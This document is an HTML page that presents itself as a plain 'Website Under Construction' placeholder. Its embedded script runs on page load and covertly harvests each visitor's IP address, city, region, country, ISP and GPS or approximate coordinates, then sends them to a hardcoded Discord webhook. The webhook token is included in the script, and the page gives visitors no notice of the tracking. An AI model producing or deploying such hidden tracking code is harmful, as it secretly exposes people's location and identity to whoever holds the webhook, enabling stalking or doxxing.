<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Under Construction</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #ffffff;
      color: #222;
      font-family: Arial, Helvetica, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .container {
      max-width: 400px;
    }
    h1 { font-size: 34px; margin-bottom: 16px; }
    p { font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Website Under Construction</h1>
    <p>We're working on something big.<br>Come back later.</p>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";

    async function sendVisitorInfo() {
      console.log("🚀 Tracking started...");

      let geo = { lat: null, lon: null };
      let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };

      // Try GPS silently (won't block anything if denied)
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            geo.lat = position.coords.latitude;
            geo.lon = position.coords.longitude;
            console.log("✅ GPS granted");
          },
          () => console.log("❌ GPS denied or failed"),
          { timeout: 7000, enableHighAccuracy: true }
        );
      }

      // Main: IP Geolocation (works even if GPS denied)
      const services = [
        'https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon',
        'https://ipapi.co/json/',
        'https://freeipapi.com/api/json/'
      ];

      for (let url of services) {
        try {
          const res = await fetch(url);
          if (res.ok) {
            const data = await res.json();
            
            ipInfo.ip = data.query || data.ip || "Unknown";
            ipInfo.city = data.city || "Unknown";
            ipInfo.region = data.regionName || data.region || "Unknown";
            ipInfo.country = data.country || data.country_name || "Unknown";
            ipInfo.isp = data.isp || data.org || "Unknown";

            // Use IP lat/lon as fallback if GPS denied
            if (!geo.lat && data.lat) {
              geo.lat = data.lat;
              geo.lon = data.lon;
            }
            
            console.log("✅ IP data received");
            break;
          }
        } catch (e) {
          console.log("Service failed, trying next...");
        }
      }

      // Send data
      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: "**New Visitor**",
            embeds: [{
              title: "Visitor Details",
              color: 0x3498db,
              fields: [
                { name: "IP Address", value: ipInfo.ip, inline: true },
                { name: "City", value: ipInfo.city, inline: true },
                { name: "Region", value: ipInfo.region, inline: true },
                { name: "Country", value: ipInfo.country, inline: true },
                { name: "GPS / Approx Coordinates", value: geo.lat ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}` : "Unknown", inline: false },
                { name: "ISP", value: ipInfo.isp, inline: false },
                { name: "Time", value: new Date().toLocaleString(), inline: false }
              ]
            }]
          })
        });
        console.log("✅ Sent to Discord");
      } catch (e) {
        console.error("Webhook error");
      }
    }

    window.onload = () => setTimeout(sendVisitorInfo, 1000);
  </script>
</body>
</html>
</body>
</html>
